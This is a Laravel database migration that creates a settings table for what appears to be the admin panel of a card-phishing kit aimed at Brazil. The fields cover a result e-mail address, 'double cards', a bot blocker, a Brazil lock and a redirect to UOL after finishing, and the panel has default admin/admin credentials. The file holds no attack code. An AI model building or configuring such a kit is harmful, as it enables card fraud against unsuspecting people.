<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration {
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('settings', static function (Blueprint $table) {
            $table->id();
            $table->string('admin_panel')->default('admin');
            $table->string('username')->default('admin');
            $table->string('password')->default(bcrypt('admin'));
            $table->boolean('lock_brazil')->default(false);
            $table->string('stopbot')->nullable();
            $table->string('email_result')->default('me@localhost');
            $table->boolean('redirect_on_finish')->default(false);
            $table->boolean('double_cards')->default(false);
            $table->string('parameter')->nullable();
            $table->string('external_redirect')->default('https://www.UOL.com.br');
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('settings');
    }
};
